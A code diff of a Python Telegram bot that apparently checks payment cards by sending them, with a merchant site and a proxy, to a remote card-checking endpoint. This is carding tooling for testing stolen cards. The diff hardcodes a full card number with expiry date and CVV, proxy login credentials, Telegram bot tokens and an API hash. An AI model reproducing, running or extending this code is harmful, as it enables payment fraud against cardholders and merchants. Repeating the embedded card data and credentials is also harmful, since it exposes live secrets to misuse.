@@ -11,7 +11,7 @@ from urllib.parse import urlparse
 # Config
 API_ID = 35384207
 API_HASH = "09c4bc9de62a417ccdd0c69b33912515"
-BOT_TOKEN = "8518219738:AAEtt9Pfr5JUitlukorNMlLB2Epc47cNPt4" # Replace with your Bot Token
+BOT_TOKEN = "8518219738:AAGJxyLm7zpUXla7tE29pxaoNcflBxJZzcw" # Replace with your Bot Token
 ADMIN_ID = [6263030724,8538835940,8199994609 , 8515333615] # Replace with your Admin ID(s)
 GROUP_ID = -1003413954160 # Replace with your Group ID
 
@@ -228,9 +228,9 @@ async def check_card_random_site(card, sites, user_id=None):
                 proxy_str = f"{ip}:{port}"
         
         # Build API URL with new endpoint
-        url = f'https://teamoicxkiller.online/code/index.php?cc={card}&url={selected_site}'
+        url = f'http://108.165.12.183:8081/?cc=5509890034877216|06|2028|333&url=https://anseladams.org'
         if proxy_str:
-            url += f'&proxy={proxy_str}'
+            url += f'&proxy=px023005.pointtoserver.com:10780:purevpn0s13918563:fV21iqc3trwCAs'
         
         timeout = aiohttp.ClientTimeout(total=100)
         async with aiohttp.ClientSession(timeout=timeout) as session:
@@ -306,10 +306,10 @@ async def check_card_specific_site(card, site, user_id=None):
                 proxy_str = f"{ip}:{port}"
         
         # Build API URL with new endpoint
-        url = f'https://teamoicxkiller.online/code/index.php?cc={card}&url={site}'
+        url = f'http://108.165.12.183:8081/?cc=5509890034877216|06|2028|333&url=https://anseladams.org'
         if proxy_str:
-            url += f'&proxy={proxy_str}'
-        
+            url += f'&proxy=px023005.pointtoserver.com:10780:purevpn0s13918563:fV21iqc3trwCAs'
+            
         timeout = aiohttp.ClientTimeout(total=100)
         async with aiohttp.ClientSession(timeout=timeout) as session:
             async with session.get(url) as res:
